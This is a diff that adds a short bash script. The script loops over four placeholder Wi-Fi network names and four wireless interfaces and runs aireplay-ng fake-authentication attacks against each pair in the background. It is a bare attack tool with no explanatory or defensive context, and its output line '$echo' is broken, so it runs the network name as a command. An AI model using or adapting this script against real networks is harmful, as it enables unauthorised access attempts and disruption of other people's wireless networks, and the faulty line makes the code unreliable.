@@ -1,0 +1,9 @@
+#!/bin/bash
+for a in ESSID1 ESSID2 ESSID3 ESSID4
+do
+for b in wlan1 wlan2 wlan3 wlan4
+	do 
+    		aireplay-ng --fakeauth 5 -e $a $b &
+		$echo $a" "$b
+	done
+done
